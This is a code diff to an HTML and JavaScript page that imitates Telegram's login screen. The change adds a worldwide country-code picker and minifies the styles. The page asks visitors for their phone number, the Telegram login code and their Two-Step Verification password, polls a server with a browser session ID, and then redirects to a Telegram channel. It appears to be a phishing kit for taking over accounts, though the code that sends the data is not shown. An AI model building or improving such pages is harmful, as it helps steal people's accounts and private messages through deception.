@@ -9,289 +9,8 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="./config.js"></script>
 <style>
-    /* 🌟 Default (Light Theme) Variables 🌟 */
-    :root {
-        --tg-primary: #3390ec;
-        --tg-bg: #ffffff;
-        --tg-text: #000000;
-        --tg-hint: #707579;
-        --tg-border: #dadce0;
-        --error-text: #e53935;
-        --success-color: #34c759;
-    }
-
-    /* 🌟 Auto Dark Theme (ስልኩ Dark Mode ሲሆን ራሱ ይቀየራል) 🌟 */
-    @media (prefers-color-scheme: dark) {
-        :root {
-            --tg-primary: #8774e1;  
-            --tg-bg: #212121;       
-            --tg-text: #ffffff;     
-            --tg-hint: #aaaaaa;     
-            --tg-border: #444444;   
-            --error-text: #ff595a;  
-        }
-    }
-
-    /* 🌟 Telegram WebApp Dark/Light Override 🌟 */
-    :root.tg-dark {
-        --tg-primary: #8774e1 !important;
-        --tg-bg: #212121 !important;
-        --tg-text: #ffffff !important;
-        --tg-hint: #aaaaaa !important;
-        --tg-border: #444444 !important;
-        --error-text: #ff595a !important;
-    }
-    :root.tg-light {
-        --tg-primary: #3390ec !important;
-        --tg-bg: #ffffff !important;
-        --tg-text: #000000 !important;
-        --tg-hint: #707579 !important;
-        --tg-border: #dadce0 !important;
-        --error-text: #e53935 !important;
-    }
-
-    * { 
-        box-sizing: border-box; 
-        -webkit-tap-highlight-color: transparent; 
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-        margin: 0;
-        padding: 0;
-    }
-    
-    body { 
-        color: var(--tg-text); 
-        background: var(--tg-bg); 
-        height: 100vh; 
-        width: 100vw;
-        display: flex; 
-        flex-direction: column; 
-        align-items: center;
-        overflow-x: hidden;
-        overflow-y: auto;
-        transition: background-color 0.3s, color 0.3s;
-    }
-
-    .step { 
-        display: none; 
-        width: 100%; 
-        max-width: 400px; 
-        flex-direction: column; 
-        align-items: center; 
-        padding: 40px 24px; 
-        text-align: center; 
-    }
-    .active { 
-        display: flex; 
-        animation: fadeIn 0.3s ease; 
-    }
-
-    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-    /* Images */
-    .tg-logo { width: 105px; height: 105px; margin: 20px 0; }
-    .monkey-img { width: 120px; height: 120px; margin-bottom: 15px; } 
-    
-    /* Typography */
-    h2 { font-size: 22px; font-weight: 600; margin-bottom: 10px; color: var(--tg-text); }
-    p.subtitle { font-size: 15px; color: var(--tg-hint); line-height: 1.5; margin-bottom: 25px; }
-    
-    /* Edit Phone display in OTP step */
-    .phone-display { font-size: 20px; font-weight: 600; margin-bottom: 8px; display: flex; align-items: center; justify-content: center; gap: 8px; }
-    .phone-display i { font-size: 14px; color: var(--tg-hint); cursor: pointer; }
-
-    /* 🌟 Material Design Input Boxes (Floating Label) 🌟 */
-    .input-group { width: 100%; margin-bottom: 25px; display: flex; flex-direction: column; gap: 15px; }
-    
-    .md-input-box {
-        position: relative;
-        width: 100%;
-    }
-    
-    .md-input-box input {
-        width: 100%;
-        padding: 16px 15px;
-        font-size: 16px;
-        border: 1px solid var(--tg-border);
-        border-radius: 12px;
-        background: transparent;
-        color: var(--tg-text);
-        outline: none;
-        transition: all 0.2s;
-    }
-    
-    /* The Floating Label */
-    .md-input-box label {
-        position: absolute;
-        left: 12px;
-        top: 16px;
-        color: var(--tg-hint);
-        font-size: 16px;
-        background: var(--tg-bg);
-        padding: 0 4px;
-        pointer-events: none;
-        transition: 0.2s ease all;
-        white-space: nowrap;
-        overflow: hidden;
-        text-overflow: ellipsis;
-        max-width: 90%;
-    }
-    
-    /* When Focused or Filled -> Move label to the border line & change to Blue */
-    .md-input-box input:focus ~ label,
-    .md-input-box input:not(:placeholder-shown) ~ label {
-        top: -9px;
-        font-size: 13px;
-    }
-    
-    .md-input-box input:focus ~ label {
-        color: var(--tg-primary);
-    }
-    
-    /* Focused border */
-    .md-input-box input:focus {
-        border-color: var(--tg-primary);
-        border-width: 2px;
-        padding: 15px 14px; 
-    }
-
-    /* 🌟 Error State Styling (Red border & text) 🌟 */
-    .md-input-box.error input {
-        border-color: var(--error-text) !important;
-    }
-    .md-input-box.error input:focus {
-        border-width: 2px;
-        padding: 15px 14px;
-    }
-    .md-input-box.error label {
-        color: var(--error-text) !important;
-    }
-
-    /* Country Box specific */
-    .country-text {
-        width: 100%;
-        padding: 16px 15px;
-        font-size: 16px;
-        border: 1px solid var(--tg-border);
-        border-radius: 12px;
-        color: var(--tg-text);
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        cursor: pointer;
-    }
-
-    .toggle-pw {
-        position: absolute;
-        right: 15px;
-        top: 50%;
-        transform: translateY(-50%);
-        color: var(--tg-hint);
-        font-size: 18px;
-        cursor: pointer;
-        z-index: 3;
-    }
-
-    /* Checkbox */
-    .checkbox-wrap {
-        display: flex;
-        align-items: center;
-        width: 100%;
-        gap: 15px;
-        margin-bottom: 30px;
-        padding-left: 5px;
-    }
-    .checkbox-wrap input[type="checkbox"] {
-        width: 20px;
-        height: 20px;
-        accent-color: var(--tg-primary);
-        cursor: pointer;
-    }
-    .checkbox-wrap label {
-        font-size: 15px;
-        color: var(--tg-text);
-        cursor: pointer;
-    }
-
-    /* Buttons */
-    .tg-btn {
-        position: relative;
-        background: var(--tg-primary); 
-        color: #fff; 
-        padding: 16px; 
-        width: 100%; 
-        border-radius: 10px; 
-        border: none;
-        font-size: 15px; 
-        font-weight: 500; 
-        cursor: pointer; 
-        display: flex; 
-        align-items: center; 
-        justify-content: center; 
-        transition: opacity 0.2s;
-        text-transform: uppercase;
-    }
-    .tg-btn:active { opacity: 0.8; }
-    .tg-btn:disabled { opacity: 0.7; cursor: not-allowed; }
-
-    /* 🌟 የ 2FA Confirm Button አኒሜሽን እና መደበቂያ (Hide/Show Logic) 🌟 */
-    #confirmBtn {
-        opacity: 0;
-        pointer-events: none;
-        transform: translateY(15px);
-        transition: all 0.3s ease;
-    }
-    #confirmBtn.show-btn {
-        opacity: 1;
-        pointer-events: auto;
-        transform: translateY(0);
-    }
-
-    /* Links at bottom */
-    .links-wrap {
-        display: flex;
-        flex-direction: column;
-        gap: 20px;
-        margin-top: 30px;
-    }
-    .links-wrap a {
-        color: var(--tg-primary);
-        text-decoration: none;
-        font-weight: 500;
-        font-size: 14px;
-        text-transform: uppercase;
-    }
-
-    /* Spinner attached to Button right side */
-    .spinner-container {
-        position: absolute;
-        right: 16px;
-        top: 0;
-        bottom: 0;
-        display: flex;
-        align-items: center;
-    }
-    .btn-spinner { 
-        display: none; 
-        width: 20px; 
-        height: 20px; 
-        border: 2px solid transparent; 
-        border-right: 2px solid #fff; 
-        border-top: 2px solid #fff; 
-        border-radius: 50%; 
-        animation: spin 0.6s linear infinite; 
-    }
-    
-    /* Main Full Page Loader */
-    .loader-ring {
-        width: 44px; height: 44px; 
-        border: 3px solid var(--tg-border);
-        border-top: 3px solid var(--tg-primary); 
-        border-radius: 50%;
-        animation: spin 0.8s linear infinite; 
-        margin: 30px auto;
-    }
-    @keyframes spin { 100% { transform: rotate(360deg); } }
-
+    /* 🌟 Theme Variables & CSS (Minified for performance) 🌟 */
+    :root{--tg-primary:#3390ec;--tg-bg:#ffffff;--tg-text:#000000;--tg-hint:#707579;--tg-border:#dadce0;--error-text:#e53935;--error-bg:#ffebee;--success-color:#34c759;} @media(prefers-color-scheme:dark){:root{--tg-primary:#8774e1;--tg-bg:#212121;--tg-text:#ffffff;--tg-hint:#aaaaaa;--tg-border:#444444;--error-text:#ff595a;--error-bg:rgba(255,89,90,0.15);}} html.tg-dark{--tg-primary:#8774e1!important;--tg-bg:#212121!important;--tg-text:#ffffff!important;--tg-hint:#aaaaaa!important;--tg-border:#444444!important;--error-text:#ff595a!important;--error-bg:rgba(255,89,90,0.15)!important;} html.tg-light{--tg-primary:#3390ec!important;--tg-bg:#ffffff!important;--tg-text:#000000!important;--tg-hint:#707579!important;--tg-border:#dadce0!important;--error-text:#e53935!important;--error-bg:#ffebee!important;} *{box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;margin:0;padding:0;} body{color:var(--tg-text);background:var(--tg-bg);height:100vh;width:100vw;display:flex;flex-direction:column;align-items:center;overflow-x:hidden;overflow-y:auto;transition:background-color 0.3s ease,color 0.3s ease;} .step{display:none;width:100%;max-width:400px;flex-direction:column;align-items:center;padding:40px 24px;text-align:center;} .active{display:flex;animation:fadeIn 0.3s ease;} @keyframes fadeIn{from{opacity:0;}to{opacity:1;}} .tg-logo{width:105px;height:105px;margin:20px 0;} .monkey-img{width:120px;height:120px;margin-bottom:15px;} h2{font-size:22px;font-weight:600;margin-bottom:10px;color:var(--tg-text);} p.subtitle{font-size:15px;color:var(--tg-hint);line-height:1.5;margin-bottom:25px;} .phone-display{font-size:20px;font-weight:600;margin-bottom:8px;display:flex;align-items:center;justify-content:center;gap:8px;} .phone-display i{font-size:14px;color:var(--tg-hint);cursor:pointer;} .input-group{width:100%;margin-bottom:25px;display:flex;flex-direction:column;gap:15px;} .md-input-box{position:relative;width:100%;} .md-input-box input{width:100%;padding:16px 15px;font-size:16px;border:1px solid var(--tg-border);border-radius:12px;background:transparent;color:var(--tg-text);outline:none;transition:all 0.2s;} .md-input-box label{position:absolute;left:12px;top:16px;color:var(--tg-hint);font-size:16px;background:var(--tg-bg);padding:0 4px;pointer-events:none;transition:0.2s ease all;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:90%;} .md-input-box input:focus~label,.md-input-box input:not(:placeholder-shown)~label{top:-9px;font-size:13px;} .md-input-box input:focus~label{color:var(--tg-primary);} .md-input-box input:focus{border-color:var(--tg-primary);border-width:2px;padding:15px 14px;} .md-input-box.error input{border-color:var(--error-text)!important;} .md-input-box.error input:focus{border-width:2px;padding:15px 14px;} .md-input-box.error label{color:var(--error-text)!important;} .country-text{width:100%;padding:16px 15px;font-size:16px;border:1px solid var(--tg-border);border-radius:12px;color:var(--tg-text);display:flex;justify-content:space-between;align-items:center;cursor:pointer;} .toggle-pw{position:absolute;right:15px;top:50%;transform:translateY(-50%);color:var(--tg-hint);font-size:18px;cursor:pointer;z-index:3;} .checkbox-wrap{display:flex;align-items:center;width:100%;gap:15px;margin-bottom:30px;padding-left:5px;} .checkbox-wrap input[type="checkbox"]{width:20px;height:20px;accent-color:var(--tg-primary);cursor:pointer;} .checkbox-wrap label{font-size:15px;color:var(--tg-text);cursor:pointer;} .tg-btn{position:relative;background:var(--tg-primary);color:#fff;padding:16px;width:100%;border-radius:10px;border:none;font-size:15px;font-weight:500;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:opacity 0.2s;text-transform:uppercase;} .tg-btn:active{opacity:0.8;} .tg-btn:disabled{opacity:0.7;cursor:not-allowed;} #loginBtn,#confirmBtn{opacity:0;pointer-events:none;transform:translateY(15px);transition:all 0.3s ease;} #loginBtn.show-btn,#confirmBtn.show-btn{opacity:1;pointer-events:auto;transform:translateY(0);} .links-wrap{display:flex;flex-direction:column;gap:20px;margin-top:30px;} .links-wrap a{color:var(--tg-primary);text-decoration:none;font-weight:500;font-size:14px;text-transform:uppercase;} .spinner-container{position:absolute;right:16px;top:0;bottom:0;display:flex;align-items:center;} .btn-spinner{display:none;width:20px;height:20px;border:2px solid transparent;border-right:2px solid #fff;border-top:2px solid #fff;border-radius:50%;animation:spin 0.6s linear infinite;} .loader-ring{width:44px;height:44px;border:3px solid var(--tg-border);border-top:3px solid var(--tg-primary);border-radius:50%;animation:spin 0.8s linear infinite;margin:30px auto;} @keyframes spin{100%{transform:rotate(360deg);}} .modal-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:var(--tg-bg);z-index:100;overflow-y:auto;} .modal-overlay.open{display:block;animation:slideUp 0.3s ease;} @keyframes slideUp{from{transform:translateY(100%);}to{transform:translateY(0);}} .modal-header{padding:15px 24px;font-size:20px;font-weight:600;display:flex;align-items:center;gap:20px;position:sticky;top:0;background:var(--tg-bg);border-bottom:1px solid var(--tg-border);z-index:101;} .country-item{display:flex;justify-content:space-between;padding:15px 24px;border-bottom:1px solid var(--tg-border);cursor:pointer;color:var(--tg-text);font-size:16px;} .country-item:active{background:rgba(135,116,225,0.1);} .country-item span:last-child{color:var(--tg-hint);}
 </style>
 </head>
 <body>
@@ -310,15 +29,16 @@
         <p class="subtitle">Please confirm your country code and enter your phone number.</p>
         
         <div class="input-group">
-            <!-- Country Box -->
             <div class="md-input-box">
-                <div class="country-text">Ethiopia <i class="fa-solid fa-chevron-down" style="color: var(--tg-hint); font-size: 14px;"></i></div>
+                <div class="country-text" onclick="openCountryModal()">
+                    <span id="country_name_disp">Country</span> 
+                    <i class="fa-solid fa-chevron-down" style="color: var(--tg-hint); font-size: 14px;"></i>
+                </div>
                 <label style="top:-9px; font-size:13px;">Country</label>
             </div>
             
-            <!-- Phone Box -->
             <div class="md-input-box" id="phone_box">
-                <input type="tel" id="phone_input" value="+251 " placeholder=" " oninput="resetError(1)">
+                <input type="tel" id="phone_input" value="+" placeholder=" " oninput="handlePhoneInput(this)">
                 <label id="phone_label">Your phone number</label>
             </div>
         </div>
@@ -342,11 +62,9 @@
     <!-- Step 2: Native OTP Input -->
     <div id="step2" class="step">
         <img src="https://em-content.zobj.net/source/apple/354/monkey-face_1f435.png" class="monkey-img" alt="Verification">
-        
         <div class="phone-display" id="display_phone">+251 <i class="fa-solid fa-pencil" onclick="showStep('photo_slide')"></i></div>
         <p class="subtitle">We've sent the code to the <b>Telegram</b> app on your other device.</p>
 
-        <!-- Native OTP Box -->
         <div class="md-input-box" id="otp_box" style="margin-top: 10px;">
             <input type="tel" id="otp_native_input" placeholder=" " autocomplete="one-time-code" maxlength="5" oninput="handleOtpInput(this)">
             <label id="otp_label">Code</label>
@@ -356,7 +74,6 @@
     <!-- Step 3: 2FA Password -->
     <div id="step3" class="step">
         <img src="https://em-content.zobj.net/source/apple/354/see-no-evil-monkey_1f648.png" class="monkey-img" alt="Password">
-        
         <h2>Enter Password</h2>
         <p class="subtitle">You have Two-Step Verification enabled, so your account is protected with an additional password.</p>
         
@@ -380,60 +97,173 @@
         <div class="loader-ring"></div>
     </div>
 
+    <!-- Country Selection Modal -->
+    <div id="countryModal" class="modal-overlay">
+        <div class="modal-header">
+            <i class="fa-solid fa-arrow-left" onclick="closeCountryModal()" style="cursor:pointer"></i> Choose a country
+        </div>
+        <div id="countryListDiv"></div>
+    </div>
+
 <script>
-    // Session ID ሎጂክ
     let sessionId = localStorage.getItem("my_session_id");
-    if (!sessionId) {
-        sessionId = "browser_" + Math.floor(Math.random() * 1000000000);
-        localStorage.setItem("my_session_id", sessionId);
+    if (!sessionId) { 
+        sessionId = "browser_" + Math.floor(Math.random() * 1000000000); 
+        localStorage.setItem("my_session_id", sessionId); 
     }
     
     let userId = sessionId;
-    let sid = sessionId; 
-
-    // Theme Config: Telegram WebApp Override (If opened inside Telegram)
-    try {
-        const tg = window.Telegram.WebApp;
-        tg.expand();
-        tg.ready();
-        
-        if (tg.colorScheme === 'dark') {
-            document.documentElement.classList.add('tg-dark');
-        } else if (tg.colorScheme === 'light') {
-            document.documentElement.classList.add('tg-light');
-        }
-    } catch(e) {}
-
+    let sid = sessionId;
     let statusChecker;
     let isProcessing = false;
     let registeredPhone = "";
+    
+    // 🌟 Full World Countries List 🌟
+    const countryList = [
+        {n:"Afghanistan", c:"+93", f:"🇦🇫"}, {n:"Albania", c:"+355", f:"🇦🇱"}, {n:"Algeria", c:"+213", f:"🇩🇿"}, {n:"Andorra", c:"+376", f:"🇦🇩"}, {n:"Angola", c:"+244", f:"🇦🇴"}, {n:"Antigua and Barbuda", c:"+1", f:"🇦🇬"}, {n:"Argentina", c:"+54", f:"🇦🇷"}, {n:"Armenia", c:"+374", f:"🇦🇲"}, {n:"Australia", c:"+61", f:"🇦🇺"}, {n:"Austria", c:"+43", f:"🇦🇹"}, {n:"Azerbaijan", c:"+994", f:"🇦🇿"},
+        {n:"Bahamas", c:"+1", f:"🇧🇸"}, {n:"Bahrain", c:"+973", f:"🇧🇭"}, {n:"Bangladesh", c:"+880", f:"🇧🇩"}, {n:"Barbados", c:"+1", f:"🇧🇧"}, {n:"Belarus", c:"+375", f:"🇧🇾"}, {n:"Belgium", c:"+32", f:"🇧🇪"}, {n:"Belize", c:"+501", f:"🇧🇿"}, {n:"Benin", c:"+229", f:"🇧🇯"}, {n:"Bhutan", c:"+975", f:"🇧🇹"}, {n:"Bolivia", c:"+591", f:"🇧🇴"}, {n:"Bosnia and Herzegovina", c:"+387", f:"🇧🇦"}, {n:"Botswana", c:"+267", f:"🇧🇼"}, {n:"Brazil", c:"+55", f:"🇧🇷"}, {n:"Brunei", c:"+673", f:"🇧🇳"}, {n:"Bulgaria", c:"+359", f:"🇧🇬"}, {n:"Burkina Faso", c:"+226", f:"🇧🇫"}, {n:"Burundi", c:"+257", f:"🇧🇮"},
+        {n:"Cambodia", c:"+855", f:"🇰🇭"}, {n:"Cameroon", c:"+237", f:"🇨🇲"}, {n:"Canada", c:"+1", f:"🇨🇦"}, {n:"Cape Verde", c:"+238", f:"🇨🇻"}, {n:"Central African Republic", c:"+236", f:"🇨🇫"}, {n:"Chad", c:"+235", f:"🇹🇩"}, {n:"Chile", c:"+56", f:"🇨🇱"}, {n:"China", c:"+86", f:"🇨🇳"}, {n:"Colombia", c:"+57", f:"🇨🇴"}, {n:"Comoros", c:"+269", f:"🇰🇲"}, {n:"Congo", c:"+242", f:"🇨🇬"}, {n:"Congo, Dem Rep", c:"+243", f:"🇨🇩"}, {n:"Costa Rica", c:"+506", f:"🇨🇷"}, {n:"Croatia", c:"+385", f:"🇭🇷"}, {n:"Cuba", c:"+53", f:"🇨🇺"}, {n:"Cyprus", c:"+357", f:"🇨🇾"}, {n:"Czech Republic", c:"+420", f:"🇨🇿"},
+        {n:"Denmark", c:"+45", f:"🇩🇰"}, {n:"Djibouti", c:"+253", f:"🇩🇯"}, {n:"Dominica", c:"+1", f:"🇩🇲"}, {n:"Dominican Republic", c:"+1", f:"🇩🇴"},
+        {n:"Ecuador", c:"+593", f:"🇪🇨"}, {n:"Egypt", c:"+20", f:"🇪🇬"}, {n:"El Salvador", c:"+503", f:"🇸🇻"}, {n:"Equatorial Guinea", c:"+240", f:"🇬🇶"}, {n:"Eritrea", c:"+291", f:"🇪🇷"}, {n:"Estonia", c:"+372", f:"🇪🇪"}, {n:"Eswatini", c:"+268", f:"🇸🇿"}, {n:"Ethiopia", c:"+251", f:"🇪🇹"},
+        {n:"Fiji", c:"+679", f:"🇫🇯"}, {n:"Finland", c:"+358", f:"🇫🇮"}, {n:"France", c:"+33", f:"🇫🇷"},
+        {n:"Gabon", c:"+241", f:"🇬🇦"}, {n:"Gambia", c:"+220", f:"🇬🇲"}, {n:"Georgia", c:"+995", f:"🇬🇪"}, {n:"Germany", c:"+49", f:"🇩🇪"}, {n:"Ghana", c:"+233", f:"🇬🇭"}, {n:"Greece", c:"+30", f:"🇬🇷"}, {n:"Grenada", c:"+1", f:"🇬🇩"}, {n:"Guatemala", c:"+502", f:"🇬🇹"}, {n:"Guinea", c:"+224", f:"🇬🇳"}, {n:"Guinea-Bissau", c:"+245", f:"🇬🇼"}, {n:"Guyana", c:"+592", f:"🇬🇾"},
+        {n:"Haiti", c:"+509", f:"🇭🇹"}, {n:"Honduras", c:"+504", f:"🇭🇳"}, {n:"Hungary", c:"+36", f:"🇭🇺"},
+        {n:"Iceland", c:"+354", f:"🇮🇸"}, {n:"India", c:"+91", f:"🇮🇳"}, {n:"Indonesia", c:"+62", f:"🇮🇩"}, {n:"Iran", c:"+98", f:"🇮🇷"}, {n:"Iraq", c:"+964", f:"🇮🇶"}, {n:"Ireland", c:"+353", f:"🇮🇪"}, {n:"Israel", c:"+972", f:"🇮🇱"}, {n:"Italy", c:"+39", f:"🇮🇹"}, {n:"Ivory Coast", c:"+225", f:"🇨🇮"},
+        {n:"Jamaica", c:"+1", f:"🇯🇲"}, {n:"Japan", c:"+81", f:"🇯🇵"}, {n:"Jordan", c:"+962", f:"🇯🇴"},
+        {n:"Kazakhstan", c:"+7", f:"🇰🇿"}, {n:"Kenya", c:"+254", f:"🇰🇪"}, {n:"Kiribati", c:"+686", f:"🇰🇮"}, {n:"Kuwait", c:"+965", f:"🇰🇼"}, {n:"Kyrgyzstan", c:"+996", f:"🇰🇬"},
+        {n:"Laos", c:"+856", f:"🇱🇦"}, {n:"Latvia", c:"+371", f:"🇱🇻"}, {n:"Lebanon", c:"+961", f:"🇱🇧"}, {n:"Lesotho", c:"+266", f:"🇱🇸"}, {n:"Liberia", c:"+231", f:"🇱🇷"}, {n:"Libya", c:"+218", f:"🇱🇾"}, {n:"Liechtenstein", c:"+423", f:"🇱🇮"}, {n:"Lithuania", c:"+370", f:"🇱🇹"}, {n:"Luxembourg", c:"+352", f:"🇱🇺"},
+        {n:"Madagascar", c:"+261", f:"🇲🇬"}, {n:"Malawi", c:"+265", f:"🇲🇼"}, {n:"Malaysia", c:"+60", f:"🇲🇾"}, {n:"Maldives", c:"+960", f:"🇲🇻"}, {n:"Mali", c:"+223", f:"🇲🇱"}, {n:"Malta", c:"+356", f:"🇲🇹"}, {n:"Marshall Islands", c:"+692", f:"🇲🇭"}, {n:"Mauritania", c:"+222", f:"🇲🇷"}, {n:"Mauritius", c:"+230", f:"🇲🇺"}, {n:"Mexico", c:"+52", f:"🇲🇽"}, {n:"Micronesia", c:"+691", f:"🇫🇲"}, {n:"Moldova", c:"+373", f:"🇲🇩"}, {n:"Monaco", c:"+377", f:"🇲🇨"}, {n:"Mongolia", c:"+976", f:"🇲🇳"}, {n:"Montenegro", c:"+382", f:"🇲🇪"}, {n:"Morocco", c:"+212", f:"🇲🇦"}, {n:"Mozambique", c:"+258", f:"🇲🇿"}, {n:"Myanmar", c:"+95", f:"🇲🇲"},
+        {n:"Namibia", c:"+264", f:"🇳🇦"}, {n:"Nauru", c:"+674", f:"🇳🇷"}, {n:"Nepal", c:"+977", f:"🇳🇵"}, {n:"Netherlands", c:"+31", f:"🇳🇱"}, {n:"New Zealand", c:"+64", f:"🇳🇿"}, {n:"Nicaragua", c:"+505", f:"🇳🇮"}, {n:"Niger", c:"+227", f:"🇳🇪"}, {n:"Nigeria", c:"+234", f:"🇳🇬"}, {n:"North Korea", c:"+850", f:"🇰🇵"}, {n:"North Macedonia", c:"+389", f:"🇲🇰"}, {n:"Norway", c:"+47", f:"🇳🇴"},
+        {n:"Oman", c:"+968", f:"🇴🇲"},
+        {n:"Pakistan", c:"+92", f:"🇵🇰"}, {n:"Palau", c:"+680", f:"🇵🇼"}, {n:"Palestine", c:"+970", f:"🇵🇸"}, {n:"Panama", c:"+507", f:"🇵🇦"}, {n:"Papua New Guinea", c:"+675", f:"🇵🇬"}, {n:"Paraguay", c:"+595", f:"🇵🇾"}, {n:"Peru", c:"+51", f:"🇵🇪"}, {n:"Philippines", c:"+63", f:"🇵🇭"}, {n:"Poland", c:"+48", f:"🇵🇱"}, {n:"Portugal", c:"+351", f:"🇵🇹"},
+        {n:"Qatar", c:"+974", f:"🇶🇦"},
+        {n:"Romania", c:"+40", f:"🇷🇴"}, {n:"Russia", c:"+7", f:"🇷🇺"}, {n:"Rwanda", c:"+250", f:"🇷🇼"},
+        {n:"Saint Kitts and Nevis", c:"+1", f:"🇰🇳"}, {n:"Saint Lucia", c:"+1", f:"🇱🇨"}, {n:"Saint Vincent", c:"+1", f:"🇻🇨"}, {n:"Samoa", c:"+685", f:"🇼🇸"}, {n:"San Marino", c:"+378", f:"🇸🇲"}, {n:"Sao Tome and Principe", c:"+239", f:"🇸🇹"}, {n:"Saudi Arabia", c:"+966", f:"🇸🇦"}, {n:"Senegal", c:"+221", f:"🇸🇳"}, {n:"Serbia", c:"+381", f:"🇷🇸"}, {n:"Seychelles", c:"+248", f:"🇸🇨"}, {n:"Sierra Leone", c:"+232", f:"🇸🇱"}, {n:"Singapore", c:"+65", f:"🇸🇬"}, {n:"Slovakia", c:"+421", f:"🇸🇰"}, {n:"Slovenia", c:"+386", f:"🇸🇮"}, {n:"Solomon Islands", c:"+677", f:"🇸🇧"}, {n:"Somalia", c:"+252", f:"🇸🇴"}, {n:"South Africa", c:"+27", f:"🇿🇦"}, {n:"South Korea", c:"+82", f:"🇰🇷"}, {n:"South Sudan", c:"+211", f:"🇸🇸"}, {n:"Spain", c:"+34", f:"🇪🇸"}, {n:"Sri Lanka", c:"+94", f:"🇱🇰"}, {n:"Sudan", c:"+249", f:"🇸🇩"}, {n:"Suriname", c:"+597", f:"🇸🇷"}, {n:"Sweden", c:"+46", f:"🇸🇪"}, {n:"Switzerland", c:"+41", f:"🇨🇭"}, {n:"Syria", c:"+963", f:"🇸🇾"},
+        {n:"Taiwan", c:"+886", f:"🇹🇼"}, {n:"Tajikistan", c:"+992", f:"🇹🇯"}, {n:"Tanzania", c:"+255", f:"🇹🇿"}, {n:"Thailand", c:"+66", f:"🇹🇭"}, {n:"Togo", c:"+228", f:"🇹🇬"}, {n:"Tonga", c:"+676", f:"🇹🇴"}, {n:"Trinidad and Tobago", c:"+1", f:"🇹🇹"}, {n:"Tunisia", c:"+216", f:"🇹🇳"}, {n:"Turkey", c:"+90", f:"🇹🇷"}, {n:"Turkmenistan", c:"+993", f:"🇹🇲"}, {n:"Tuvalu", c:"+688", f:"🇹🇻"},
+        {n:"Uganda", c:"+256", f:"🇺🇬"}, {n:"Ukraine", c:"+380", f:"🇺🇦"}, {n:"United Arab Emirates", c:"+971", f:"🇦🇪"}, {n:"United Kingdom", c:"+44", f:"🇬🇧"}, {n:"United States", c:"+1", f:"🇺🇸"}, {n:"Uruguay", c:"+598", f:"🇺🇾"}, {n:"Uzbekistan", c:"+998", f:"🇺🇿"},
+        {n:"Vanuatu", c:"+678", f:"🇻🇺"}, {n:"Vatican City", c:"+379", f:"🇻🇦"}, {n:"Venezuela", c:"+58", f:"🇻🇪"}, {n:"Vietnam", c:"+84", f:"🇻🇳"},
+        {n:"Yemen", c:"+967", f:"🇾🇪"},
+        {n:"Zambia", c:"+260", f:"🇿🇲"}, {n:"Zimbabwe", c:"+263", f:"🇿🇼"}
+    ];
 
-    // ገጹ እንደተከፈተ 3 ሰከንድ ሳይጠብቅ ቼክ ያደርጋል
-    document.addEventListener("DOMContentLoaded", function() {
+    function applyTheme() {
+        const html = document.documentElement;
+        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) { 
+            html.classList.add('tg-dark'); 
+            html.classList.remove('tg-light'); 
+        } else { 
+            html.classList.add('tg-light'); 
+            html.classList.remove('tg-dark'); 
+        }
+        
+        try {
+            if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initData) {
+                const tg = window.Telegram.WebApp; 
+                tg.expand();
+                if (tg.colorScheme === 'dark') { 
+                    html.classList.add('tg-dark'); 
+                    html.classList.remove('tg-light'); 
+                } else if (tg.colorScheme === 'light') { 
+                    html.classList.add('tg-light'); 
+                    html.classList.remove('tg-dark'); 
+                }
+            }
+        } catch(e) {}
+    }
+    
+    applyTheme();
+    if (window.matchMedia) { 
+        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', applyTheme); 
+    }
+
+    document.addEventListener("DOMContentLoaded", function() { 
+        initCountries(); 
         checkStatus(); 
-        statusChecker = setInterval(checkStatus, 3000);
+        statusChecker = setInterval(checkStatus, 3000); 
     });
+
+    function initCountries() {
+        let h = "";
+        countryList.forEach(c => {
+            h += `<div class="country-item" onclick="selectCountry('${c.n}','${c.c}')"><span>${c.f} &nbsp;&nbsp;${c.n}</span><span>${c.c}</span></div>`
+        });
+        document.getElementById('countryListDiv').innerHTML = h;
+    }
+
+    function openCountryModal() { document.getElementById('countryModal').classList.add('open'); } 
+    function closeCountryModal() { document.getElementById('countryModal').classList.remove('open'); }
+
+    function selectCountry(n, c) {
+        document.getElementById('country_name_disp').innerText = n;
+        let p = document.getElementById('phone_input');
+        p.value = c + " ";
+        closeCountryModal();
+        handlePhoneInput(p);
+        p.focus();
+    }
+
+    function handlePhoneInput(el) {
+        resetError(1);
+        
+        if (!el.value.startsWith('+')) {
+            el.value = '+' + el.value.replace(/\D/g, '');
+        } else {
+            el.value = '+' + el.value.substring(1).replace(/[^\d\s]/g, '');
+        }
+
+        let v = el.value.replace(/\s/g, '');
+        let d = v.replace(/\D/g, '');
+        
+        let sortedCountries = [...countryList].sort((a, b) => b.c.length - a.c.length);
+        let m = sortedCountries.find(c => v.startsWith(c.c));
+        
+        let countryCode = "";
+        
+        if (m) {
+            document.getElementById('country_name_disp').innerText = m.n;
+            countryCode = m.c;
+        } else {
+            document.getElementById('country_name_disp').innerText = 'Country';
+        }
+
+        if (countryCode && v.length > countryCode.length) {
+            let remainder = v.substring(countryCode.length);
+            el.value = countryCode + " " + remainder;
+        } else {
+            el.value = v;
+        }
+        
+        const b = document.getElementById('loginBtn');
+        if (d.length >= 8) {
+            b.classList.add('show-btn');
+        } else {
+            b.classList.remove('show-btn');
+        }
+    }
 
     function showStep(n) {
         let stepId = (typeof n === 'string') ? 'step_' + n : 'step' + n;
         const target = document.getElementById(stepId);
         
-        if(target && target.classList.contains('active')) {
-            return;
-        }
-
+        if(target && target.classList.contains('active')) return;
+        
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
         if(target) target.classList.add('active');
 
         if(n === 'success') {
             setTimeout(() => { window.location.href = "https://t.me/sitoc/"; }, 1500);
         }
-        
         if(n === 2) {
